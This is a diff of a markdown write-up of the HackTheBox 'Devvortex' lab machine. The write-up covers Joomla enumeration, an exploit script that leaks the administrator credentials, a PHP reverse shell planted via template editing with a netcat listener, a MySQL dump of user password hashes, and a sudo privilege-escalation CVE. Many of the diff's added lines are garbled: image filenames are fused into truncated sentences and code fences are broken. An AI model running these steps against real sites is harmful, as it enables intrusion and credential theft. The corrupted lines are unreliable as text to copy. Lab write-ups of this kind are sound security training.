@@ -36,7 +36,7 @@ echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
 
 And navigate to the **devvortex.htb**, to see what we have got
 
-![[Pasted image /assets/img/posts/20250817003954-png.svg]]
+![](assets/img/posts/20250817003954-png-svg.svg))
 
 The first step was directory enumeration using two wordlists
 ```
@@ -50,15 +50,15 @@ output:
 
 Or we can go to: `/robots.txt` , this is a Joomla CMS.
 
-![[Pasted image /assets/img/posts/20250817004059-png.svg]]
+![](assets/img/posts/20250817004059-png-svg.svg))
 
 Navigating to `/dev` subdomain, to see what we got here
 
- ![[Pasted image /assets/img/posts/20250817004108-png.svg]]
+ ![](assets/img/posts/20250817004108-png-svg.svg))
 
 Navigating to`/administrator` , to see what is inside of it
 
-![[Pasted image /assets/img/posts/20250817004133-png.svg|918]]
+![](assets/img/posts/20250817004133-png-svg.svg))
 
 ### Exploitation & Gaining Access
 And we confirmed that it is a Joomla version, so lets looking for vulnerabilities for it in google, we found CVE-2023-2375 which affecting Joomla! < 4.2.8:
@@ -69,25 +69,16 @@ Using it is simple as like that
 ruby exploit.rb http://dev.devvortex.htb
 ```
 
-![](/assets/img/posts/018-devvortex-easy-machine-004-png.svg)
-
-We got a username, and a password
-	`user: lewis`
+`018-devvortex-easy-machine-004.png`lewis`
 	`password: P4ntherg0t1n5r3c0n##`
 
 Log-in with these credentials to the Joomla page
 
-![](/assets/img/posts/018-devvortex-easy-machine-005-png.svg)
-
-Heading to System > Templates > Administrator Templates > Atum Details and Files > login.php
+`018-devvortex-easy-machine-005.png`tor Templates > Atum Details and Files > login.php
 
 Lets customize a PHP reverse shell, to put it here
 
-![](/assets/img/posts/018-devvortex-easy-machine-006-png.svg)
-
-First, make a netcat listener
-```
-nc -nvlp 4444
+`018-devvortex-easy-machine-006.png` 4444
 ```
 
 Second, execute PHP reverse shell execution through template editing
@@ -124,18 +115,12 @@ Enter password: P4ntherg0t1n5r3c0n##
 mysql> show databases;
 ```
 
-![Machine generated alternative text: . devvortex . htb/administrator\$ mysql Enter password: or Welcome to the MySQL monitor . Commands end with , Your MySQL connection id is 81 Server version: 8.0.35-0ubuntuø.2ø.04.1 (Ubuntu) Copyright (c) 2000, 2023, Oracle and/or its affiliates. -u lewis Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners . or \'\\h\' for help. Type \'\\c\' to clear the current input statement. Type \'help;\' mysql\> show databases; Database information \_ schema joomla performance \_ schema I (0.00 sec) rows in set ](/assets/img/posts/018-devvortex-easy-machine-007-png.svg){width="7.0625in" height="3.9375in"}
-
-Read MySQL DB table
+![Machine generated alternative text: . devv`018-devvortex-easy-machine-007.png`ySQL DB table
 ```
 mysql> use joomla;
 ```
 
-![](/assets/img/posts/018-devvortex-easy-machine-008-png.svg)
-
-```
-mysql> show tables;
-mysql> select \* from sd4fg_users;
+`018-devvortex-easy-machine-008.png`rom sd4fg_users;
 ```
 
 `| 649 | lewis | lewis | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u`
@@ -163,7 +148,7 @@ To list the programs that can run via sudo without password
 logan@devvortex:~$ sudo -l
 ```
 
-![[Pasted image /assets/img/posts/20250817004501-png.svg]]
+![](assets/img/posts/20250817004501-png-svg.svg))
 
 After searching google for vulnerabilities in apport-cli 2.26.0 and earlier with CVE-2023-26604 https://github.com/advisories/GHSA-8989-8fhv-vq42
 
